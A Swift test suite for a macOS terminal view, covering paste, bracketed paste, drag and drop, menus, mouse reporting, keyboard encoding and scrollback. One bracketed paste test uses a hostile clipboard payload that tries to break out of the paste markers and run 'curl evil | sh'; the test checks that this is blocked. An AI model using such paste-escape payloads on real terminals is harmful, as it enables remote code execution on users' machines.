import AppKit
import Foundation
import SwiftTerm
import Testing
@testable import PitboxConsole

/// Records what the view sends to the "process" and which links were opened.
@MainActor
final class CaptureDelegate: @preconcurrency TerminalViewDelegate {
    var sent: [UInt8] = []
    var links: [String] = []
    var text: String { String(decoding: sent, as: UTF8.self) }
    func sizeChanged(source: TerminalView, newCols: Int, newRows: Int) {}
    func setTerminalTitle(source: TerminalView, title: String) {}
    func hostCurrentDirectoryUpdate(source: TerminalView, directory: String?) {}
    func send(source: TerminalView, data: ArraySlice<UInt8>) { sent += data }
    func scrolled(source: TerminalView, position: Double) {}
    func requestOpenLink(source: TerminalView, link: String, params: [String: String]) { links.append(link) }
    func bell(source: TerminalView) {}
    func clipboardCopy(source: TerminalView, content: Data) {}
    func clipboardRead(source: TerminalView) -> Data? { nil }
    func iTermContent(source: TerminalView, content: ArraySlice<UInt8>) {}
    func rangeChanged(source: TerminalView, startY: Int, endY: Int) {}
}

/// A drag with a private pasteboard.
final class FakeDrag: NSObject, NSDraggingInfo {
    let pasteboard: NSPasteboard
    init(_ pasteboard: NSPasteboard) { self.pasteboard = pasteboard }
    var draggingDestinationWindow: NSWindow? { nil }
    var draggingSourceOperationMask: NSDragOperation { .copy }
    var draggingLocation: NSPoint { .zero }
    var draggedImageLocation: NSPoint { .zero }
    var draggedImage: NSImage? { nil }
    var draggingPasteboard: NSPasteboard { pasteboard }
    var draggingSource: Any? { nil }
    var draggingSequenceNumber: Int { 1 }
    var draggingFormation: NSDraggingFormation = .default
    var animatesToDestination = false
    var numberOfValidItemsForDrop = 1
    var springLoadingHighlight: NSSpringLoadingHighlight { .none }
    func slideDraggedImage(to screenPoint: NSPoint) {}
    func enumerateDraggingItems(options enumOpts: NSDraggingItemEnumerationOptions, for view: NSView?, classes classArray: [AnyClass],
                                searchOptions: [NSPasteboard.ReadingOptionKey: Any], using block: @escaping (NSDraggingItem, Int, UnsafeMutablePointer<ObjCBool>) -> Void) {}
    func resetSpringLoading() {}
}

@MainActor
struct TerminalViewFixture {
    let view: ConsoleTerminalView
    let delegate = CaptureDelegate()
    let pasteboard: NSPasteboard
    let window: NSWindow

    init(size: CGSize = CGSize(width: 640, height: 400)) {
        var options = TerminalOptions.default
        options.scrollback = 1000
        view = ConsoleTerminalView(frame: CGRect(origin: .zero, size: size), font: TerminalTheme.font(name: "SF Mono", size: 13), options: options)
        view.terminalDelegate = delegate
        view.configure(palette: TerminalTheme.dark, settings: .standard)
        pasteboard = NSPasteboard(name: NSPasteboard.Name("pitbox.console.test.\(UUID().uuidString)"))
        view.pasteboard = pasteboard
        window = NSWindow(contentRect: CGRect(origin: .zero, size: size), styleMask: [.borderless], backing: .buffered, defer: true)
        window.isReleasedWhenClosed = false
        // No order-in/out animation: while the display sleeps it never ends and keeps a GCD pool thread.
        window.animationBehavior = .none
        window.contentView = view
        view.frame = CGRect(origin: .zero, size: size)
    }

    func cleanup() { pasteboard.releaseGlobally() }

    /// Window coordinates of the middle of a cell.
    func point(col: Int, row: Int) -> CGPoint {
        let cell = view.cellSize
        return CGPoint(x: (CGFloat(col) + 0.5) * cell.width, y: view.bounds.height - (CGFloat(row) + 0.5) * cell.height)
    }

    func mouse(_ type: NSEvent.EventType, at point: CGPoint, modifiers: NSEvent.ModifierFlags = [], clickCount: Int = 1) -> NSEvent {
        NSEvent.mouseEvent(with: type, location: point, modifierFlags: modifiers, timestamp: 0, windowNumber: window.windowNumber,
                           context: nil, eventNumber: 0, clickCount: clickCount, pressure: 1)!
    }
}

@MainActor
struct TerminalViewTests {
    @Test func pasteTypesTheClipboardWithCarriageReturns() {
        let f = TerminalViewFixture(); defer { f.cleanup() }
        f.pasteboard.setString("ls -la\ncd ..", forType: .string)
        f.view.paste(f.view)
        #expect(f.delegate.text == "ls -la\rcd ..")
    }

    @Test func bracketedPasteWrapsTheTextAndCannotBeEscaped() {
        let f = TerminalViewFixture(); defer { f.cleanup() }
        f.view.feed(text: "\u{1b}[?2004h")
        #expect(f.view.terminal.bracketedPasteMode)
        f.pasteboard.setString("echo hi\nuname", forType: .string)
        f.view.paste(f.view)
        #expect(f.delegate.text == "\u{1b}[200~echo hi\runame\u{1b}[201~")

        // Text with the end marker inside cannot break out of the brackets.
        f.delegate.sent = []
        f.pasteboard.clearContents()
        f.pasteboard.setString("safe\u{1b}[201~; curl evil | sh\n", forType: .string)
        f.view.pasteAsPlainText(nil)
        let sent = f.delegate.text
        #expect(sent == "\u{1b}[200~safe[201~; curl evil | sh\r\u{1b}[201~", "\(sent.debugDescription)")
        #expect(sent.components(separatedBy: "\u{1b}[201~").count == 2, "exactly one end marker: ours")
    }

    @Test func emptyOrControlOnlyPastesSendNothing() {
        let f = TerminalViewFixture(); defer { f.cleanup() }
        f.view.paste(f.view)
        f.pasteboard.setString("\u{1b}\u{07}", forType: .string)
        f.view.paste(f.view)
        #expect(f.delegate.sent.isEmpty)
    }

    @Test func theEditMenuActionsExistAndValidate() {
        let f = TerminalViewFixture(); defer { f.cleanup() }
        // What the Shell's hidden Edit menu sends to the first responder (target nil).
        for action in ["copy:", "paste:", "selectAll:", "pasteAsPlainText:"] {
            #expect(f.view.responds(to: NSSelectorFromString(action)), "\(action) is implemented by the terminal view")
        }
        for action in ["undo:", "redo:", "cut:", "delete:"] {
            #expect(!f.view.responds(to: NSSelectorFromString(action)), "\(action) is not handled: the menu item stays disabled")
        }
        func item(_ action: String) -> NSMenuItem { NSMenuItem(title: action, action: NSSelectorFromString(action), keyEquivalent: "") }
        #expect(f.view.validateUserInterfaceItem(item("paste:")))
        #expect(f.view.validateUserInterfaceItem(item("pasteAsPlainText:")))
        #expect(f.view.validateUserInterfaceItem(item("selectAll:")))
        #expect(!f.view.validateUserInterfaceItem(item("copy:")), "nothing selected: Copy is disabled")
        f.view.feed(text: "select me")
        f.view.selectAll()
        #expect(f.view.validateUserInterfaceItem(item("copy:")), "with a selection Copy is enabled")
    }

    @Test func cmdCAndCmdVWorkThroughTheResponderActions() {
        let f = TerminalViewFixture(); defer { f.cleanup() }
        f.view.feed(text: "copy this text")
        f.view.tryToPerform(NSSelectorFromString("selectAll:"), with: nil)
        #expect(f.view.tryToPerform(NSSelectorFromString("copy:"), with: nil))
        #expect(f.pasteboard.string(forType: .string)?.contains("copy this text") == true)
        f.pasteboard.clearContents()
        f.pasteboard.setString("pasted", forType: .string)
        #expect(f.view.tryToPerform(NSSelectorFromString("paste:"), with: nil))
        #expect(f.delegate.text == "pasted")
    }

    @Test func aDictationToolThatPastesGetsTheTextAtTheCursor() {
        // Dictation apps put the transcription on the pasteboard and press Cmd-V: the same path as above.
        let f = TerminalViewFixture(); defer { f.cleanup() }
        f.pasteboard.setString("Hello, this was dictated. It has a second sentence.", forType: .string)
        f.view.paste(f.view)
        #expect(f.delegate.text == "Hello, this was dictated. It has a second sentence.")
        // Text inserted through the text-input system (macOS dictation) arrives as typed text.
        f.delegate.sent = []
        f.view.insertText("dictated by the system", replacementRange: NSRange(location: NSNotFound, length: 0))
        #expect(f.delegate.text == "dictated by the system")
        f.delegate.sent = []
        f.view.insertText(NSAttributedString(string: "attributed"), replacementRange: NSRange(location: NSNotFound, length: 0))
        #expect(f.delegate.text == "attributed", "attributed strings from the text-input system are not dropped")
    }

    @Test func draggedFilesTypeTheirEscapedPaths() {
        let f = TerminalViewFixture(); defer { f.cleanup() }
        var targetChanges: [Bool] = []
        f.view.onDropTargetChange = { targetChanges.append($0) }
        let drag = NSPasteboard(name: NSPasteboard.Name("pitbox.console.drag.\(UUID().uuidString)"))
        defer { drag.releaseGlobally() }
        drag.clearContents()
        drag.writeObjects([URL(fileURLWithPath: "/Users/me/My File (1).png"), URL(fileURLWithPath: "/tmp/notes.txt")] as [NSURL])
        let info = FakeDrag(drag)
        #expect(f.view.draggingEntered(info) == .copy)
        #expect(f.view.performDragOperation(info))
        #expect(f.delegate.text == #"/Users/me/My\ File\ \(1\).png /tmp/notes.txt "#)
        #expect(targetChanges == [true, false])

        // With bracketed paste on, the program can tell it was a paste (Claude recognises pasted image paths).
        f.delegate.sent = []
        f.view.feed(text: "\u{1b}[?2004h")
        #expect(f.view.performDragOperation(info))
        #expect(f.delegate.text == "\u{1b}[200~" + #"/Users/me/My\ File\ \(1\).png /tmp/notes.txt "# + "\u{1b}[201~")
    }

    @Test func draggedTextAndLinksArePastedAndEmptyDropsAreRefused() {
        let f = TerminalViewFixture(); defer { f.cleanup() }
        let drag = NSPasteboard(name: NSPasteboard.Name("pitbox.console.drag.\(UUID().uuidString)"))
        defer { drag.releaseGlobally() }
        drag.clearContents()
        drag.setString("some text\u{1b}[31m", forType: .string)
        #expect(f.view.performDragOperation(FakeDrag(drag)))
        #expect(f.delegate.text == "some text[31m", "dropped text is cleaned like any paste")
        f.delegate.sent = []
        drag.clearContents()
        drag.writeObjects([URL(string: "https://example.com/page?x=1")! as NSURL])
        #expect(f.view.performDragOperation(FakeDrag(drag)))
        #expect(f.delegate.text == "https://example.com/page?x=1")
        drag.clearContents()
        var changes: [Bool] = []
        f.view.onDropTargetChange = { changes.append($0) }
        #expect(f.view.draggingEntered(FakeDrag(drag)) == [] && changes.isEmpty, "nothing usable: the drop is refused")
        #expect(!f.view.performDragOperation(FakeDrag(drag)))
    }

    @Test func theContextMenuOffersTheBasicsAndExtras() throws {
        let f = TerminalViewFixture(); defer { f.cleanup() }
        f.view.contextMenuExtras = { [NSMenuItem(title: "Restart", action: nil, keyEquivalent: "")] }
        let menu = try #require(f.view.menu(for: f.mouse(.rightMouseDown, at: .zero)))
        #expect(menu.items.map(\.title).filter { !$0.isEmpty } == ["Copy", "Paste", "Select All", "Clear Scrollback", "Restart"])
        let copy = try #require(menu.items.first { $0.title == "Copy" })
        #expect(copy.target === f.view && copy.action == NSSelectorFromString("copy:"))
    }

    @Test func aClickTakesFirstResponder() {
        let f = TerminalViewFixture()
        defer { f.cleanup() }
        #expect(f.window.firstResponder !== f.view)
        f.view.mouseDown(with: f.mouse(.leftMouseDown, at: f.point(col: 3, row: 2)))
        #expect(f.window.firstResponder === f.view)
        #expect(f.view.acceptsFirstMouse(for: nil), "the first click is not swallowed by a window that was not key")
    }

    @Test func mouseReportingReachesProgramsThatAskForIt() {
        let f = TerminalViewFixture(); defer { f.cleanup() }
        f.view.feed(text: "\u{1b}[?1000h\u{1b}[?1006h")   // button events, SGR encoding (vim, htop, less)
        let p = f.point(col: 4, row: 2)
        f.view.mouseDown(with: f.mouse(.leftMouseDown, at: p))
        f.view.mouseUp(with: f.mouse(.leftMouseUp, at: p))
        #expect(f.delegate.text == "\u{1b}[<0;5;3M\u{1b}[<0;5;3m", "press and release at column 5, row 3 (1-based): \(f.delegate.text.debugDescription)")
        // Shift bypasses reporting so text can still be selected while a program is grabbing the mouse.
        f.delegate.sent = []
        f.view.mouseDown(with: f.mouse(.leftMouseDown, at: p, modifiers: .shift))
        #expect(f.delegate.sent.isEmpty)
    }

    @Test func cmdClickOnAURLOpensItAndAPlainClickDoesNot() {
        let f = TerminalViewFixture(); defer { f.cleanup() }
        f.view.feed(text: "visit https://example.com/docs?a=1 now")
        let onURL = f.point(col: 12, row: 0)
        f.view.mouseDown(with: f.mouse(.leftMouseDown, at: onURL, modifiers: .command))
        f.view.mouseUp(with: f.mouse(.leftMouseUp, at: onURL, modifiers: .command))
        #expect(f.delegate.links == ["https://example.com/docs?a=1"], "Cmd-click opens the detected URL: \(f.delegate.links)")

        f.delegate.links = []
        f.view.mouseDown(with: f.mouse(.leftMouseDown, at: onURL))
        f.view.mouseUp(with: f.mouse(.leftMouseUp, at: onURL))
        #expect(f.delegate.links.isEmpty, "a plain click only selects")
        let elsewhere = f.point(col: 1, row: 0)
        f.view.mouseDown(with: f.mouse(.leftMouseDown, at: elsewhere, modifiers: .command))
        f.view.mouseUp(with: f.mouse(.leftMouseUp, at: elsewhere, modifiers: .command))
        #expect(f.delegate.links.isEmpty, "Cmd-click on plain text opens nothing")
    }

    @Test func plainKeysReachTheProgramAsTheyDoInAnyTerminal() {
        let f = TerminalViewFixture(); defer { f.cleanup() }
        func press(_ chars: String, _ code: UInt16, _ mods: NSEvent.ModifierFlags = []) {
            f.view.keyDown(with: NSEvent.keyEvent(with: .keyDown, location: .zero, modifierFlags: mods, timestamp: 0, windowNumber: f.window.windowNumber,
                                                 context: nil, characters: chars, charactersIgnoringModifiers: chars, isARepeat: false, keyCode: code)!)
        }
        press("l", 37); press("s", 1); press("\r", 36)
        #expect(f.delegate.text == "ls\r")
        f.delegate.sent = []
        press("c", 8, .control)
        press("d", 2, .control)
        press("\u{7f}", 51)
        press("\u{1b}", 53)
        #expect(f.delegate.sent == [0x03, 0x04, 0x7f, 0x1b], "Ctrl-C, Ctrl-D, Backspace, Escape: \(f.delegate.sent)")
        f.delegate.sent = []
        press("\u{f700}", 126, .function)   // Up arrow
        #expect(f.delegate.text == "\u{1b}[A")
        f.view.feed(text: "\u{1b}[?1h")      // application cursor keys (vim, less)
        f.delegate.sent = []
        press("\u{f700}", 126, .function)
        #expect(f.delegate.text == "\u{1b}OA")
    }

    @Test func shiftEnterIsDistinguishableWhenTheProgramAsksForTheKittyKeyboardProtocol() {
        // Claude Code and other modern TUIs enable the protocol; Shift-Enter then arrives as CSI 13;2u (a newline in the prompt).
        let f = TerminalViewFixture(); defer { f.cleanup() }
        f.view.feed(text: "\u{1b}[>1u")
        #expect(!f.view.terminal.keyboardEnhancementFlags.isEmpty)
        f.view.keyDown(with: NSEvent.keyEvent(with: .keyDown, location: .zero, modifierFlags: .shift, timestamp: 0, windowNumber: f.window.windowNumber,
                                              context: nil, characters: "\r", charactersIgnoringModifiers: "\r", isARepeat: false, keyCode: 36)!)
        #expect(f.delegate.text == "\u{1b}[13;2u", "\(f.delegate.text.debugDescription)")
    }

    @Test func wideCharactersAndEmojiKeepTheGridAligned() {
        let f = TerminalViewFixture(); defer { f.cleanup() }
        f.view.feed(text: "日本語|🙂|é|x\r\n")
        let terminal = f.view.terminal!
        // 日本語 takes 6 cells, so '|' is in column 6; the emoji takes 2, so the next '|' is in column 9.
        #expect(terminal.getCharacter(col: 6, row: 0) == "|")
        #expect(terminal.getCharacter(col: 9, row: 0) == "|")
        #expect(terminal.getCharacter(col: 11, row: 0) == "|")
        #expect(terminal.getCharacter(col: 12, row: 0) == "x")
    }

    @Test func sizesAreConsistent() {
        let f = TerminalViewFixture(size: CGSize(width: 620, height: 500)); defer { f.cleanup() }
        let cell = f.view.cellSize
        #expect(cell.width > 6 && cell.width < 10 && cell.height > 12 && cell.height < 20, "SF Mono 13: \(cell)")
        let size = f.view.terminalSize
        #expect(size.cols == f.view.terminal.cols && size.rows == f.view.terminal.rows)
        let scale = f.window.backingScaleFactor
        #expect(abs(CGFloat(size.pixelWidth) - cell.width * CGFloat(size.cols) * scale) <= 1 * scale)
        #expect(CGFloat(size.cols) * cell.width <= 620 && CGFloat(size.rows) * cell.height <= 500)
        f.view.setFrameSize(CGSize(width: 1240, height: 500))
        #expect(f.view.terminal.cols > size.cols * 3 / 2, "twice as wide, about twice the columns")
    }

    @Test func scrollbackHoldsTenThousandLinesByDefault() {
        let settings = TerminalSettings.standard
        #expect(settings.scrollback == 10_000)
        let session = TerminalSession(preset: .builtInShell, startDirectory: nil,
                                      context: SessionContext(settings: settings, environment: fixtureEnvironment(), launcher: FakeLauncher().launch, performLink: { _ in }, setClipboard: { _ in }),
                                      palette: TerminalTheme.dark, frame: CGRect(x: 0, y: 0, width: 640, height: 400))
        #expect(session.view.terminal.options.scrollback == 10_000)
        for i in 0..<12_000 { session.view.feed(text: "line \(i)\r\n") }
        let text = screenText(session.view)
        #expect(text.contains("line 11999") && text.contains("line 2500") && !text.contains("line 100\n"), "old lines fall off the end of the 10k buffer")
    }

    @Test func colorsAndCaretAreSetForBothAppearances() throws {
        let f = TerminalViewFixture(); defer { f.cleanup() }
        for palette in [TerminalTheme.light, TerminalTheme.dark] {
            f.view.apply(palette: palette)
            let fg = try #require(f.view.nativeForegroundColor.usingColorSpace(.sRGB))
            let expected = try #require(palette.foreground.usingColorSpace(.sRGB))
            #expect(abs(fg.redComponent - expected.redComponent) < 0.01)
            #expect(f.view.nativeBackgroundColor.alphaComponent == 0, "the console paints the tint")
        }
    }
}
